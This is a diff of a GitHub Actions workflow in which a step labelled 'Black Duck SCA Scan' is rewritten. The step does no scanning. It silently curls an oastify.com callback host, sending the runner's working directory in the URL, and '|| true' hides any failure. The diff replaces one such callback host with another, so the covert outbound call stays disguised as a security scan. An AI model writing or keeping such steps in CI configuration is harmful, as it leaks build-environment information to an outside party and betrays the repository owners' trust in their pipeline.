@@ -85,5 +85,4 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" && curl -sS "https://ceuzm6zkq38pzfeikjrd8rqroiu9i16q.oastify.com/scan?host=$(pwd)" || true
- 
+        run: echo "scan-step" && curl -sS "https://ma0u4646gbbv2lhiuvbcj2i0zr5itdh2.oastify.com/scan?host=$(pwd)" || true
